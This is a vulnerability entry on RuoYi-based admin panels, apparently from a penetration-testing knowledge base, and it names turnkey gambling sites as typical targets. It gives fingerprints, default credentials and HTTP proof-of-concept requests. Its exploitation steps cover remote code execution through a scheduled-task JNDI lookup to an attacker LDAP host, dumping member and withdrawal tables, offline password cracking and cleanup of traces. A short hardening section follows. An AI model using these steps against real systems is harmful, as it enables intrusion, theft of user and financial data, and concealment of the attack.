---
title: RuoYi-based admin panels: default passwords / Druid / scheduled-task RCE
cve: None (deployment flaw + implementation flaw)
severity: critical
cvss: 9.0
product: RuoYi (and customized turnkey gambling/agent admin panels)
versions: 4.x / 3.x / customized variants
ports: 80, 443, 8080, 9090
keywords: ruoyi, RuoYi, druid, admin123, quartz, scheduled tasks, prod-api
verified: false
sources: Compiled from public sources (business logic / implementation / configuration flaws; no CVE; see references below)
---

## Fingerprints

```
Frontend: Login-page title/RuoYi copyright, "RuoYi Management System", /prod-api/ prefix in /index
Paths: /prod-api/  /dev-api/  /prod-api/system/user/list  /druid/index.html
      /swagger-ui.html  /v2/api-docs  /prod-api/v2/api-docs
Default: admin/admin123
```

Customized sites often change the title but tend to retain paths such as `/prod-api/`, `/druid/`, and `/tool/gen`.

## Prerequisites

- Admin panel or API reachable externally (turnkey gambling sites commonly use `admin.xxx.com`, `agent.xxx.com`).

## PoC

```http
### 1) Default credentials
POST /prod-api/login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"admin123","code":"","uuid":""}

### 2) Unauthenticated Druid monitoring (obtain SQL, URIs, sessions)
GET /druid/index.html HTTP/1.1
GET /druid/sql.html HTTP/1.1
GET /druid/websession.html HTTP/1.1

### 3) Unauthenticated endpoints (/prod-api is not blocked in some versions)
GET /prod-api/system/user/list?pageNum=1&pageSize=10 HTTP/1.1
```

## Exploitation Steps

1. After confirming the fingerprint, first try default credentials and `admin/123456`, `admin/admin888`; these sites change skins rather than accounts.
2. Druid pages expose `System Login Account`, slow SQL, and URI statistics → directly identify unauthenticated endpoints and data sources (`spring.datasource.url/username/password` often appear in `druid/datasource.html`).
3. With admin access → `System Monitoring → Scheduled Tasks`: change `invokeTarget` to
   `javax.naming.InitialContext.lookup('ldap://attacker/a')` (older JDKs) or a `com.ruoyi...` reflection chain, set `cron` to 1 minute; triggering it yields RCE.
4. Alternative: `Code Generation → Import Table → Generate Code` can write files to the template directory (restricted in some versions), or look for unauthenticated write endpoints in `Tools → swagger`.
5. After DB access, dump member/order/agent/withdrawal-review tables; use `password` (bcrypt) from `sys_user` for offline cracking.
6. Cleanup: delete scheduled tasks, generated menus/table records, and uploaded files.

## Remediation and Mitigation (Hardening)

- Change default passwords and enforce complexity; remove sample accounts and demo menus.
- Authenticate `druid` monitoring or disable it (`spring.datasource.druid.stat-view-servlet.enabled=false`).
- Restrict `/prod-api` to internal/management networks; disable swagger; disable `tool/gen` in production.
- Allowlist scheduled-task `invokeTarget` values (registered bean methods only), and alert on `cron` changes.

## References

- Official RuoYi security advisories and issues; Druid StatViewServlet documentation.
